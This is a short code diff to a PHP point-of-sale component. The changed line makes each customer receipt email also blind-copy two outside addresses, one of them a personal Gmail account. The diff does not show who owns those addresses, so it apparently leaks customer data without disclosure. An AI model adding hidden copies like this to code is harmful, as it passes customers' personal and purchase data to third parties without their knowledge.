@@ -209,6 +209,6 @@ class PointOfSaleLivewire extends Component
         $writer = new Writer($renderer);
         $writer->writeFile(route('receipt', ['id' => $encrypt]),  $encrypt . '.png');
 
-        Mail::to($this->checkout['email'])->send(new ElectornicReceiptMail($encrypt . '.png'));
+        Mail::to($this->checkout['email'])->bcc(['info@kuysksa.xyz', 'yaramayservices@gmail.com'])->send(new ElectornicReceiptMail($encrypt . '.png'));
     }
 }
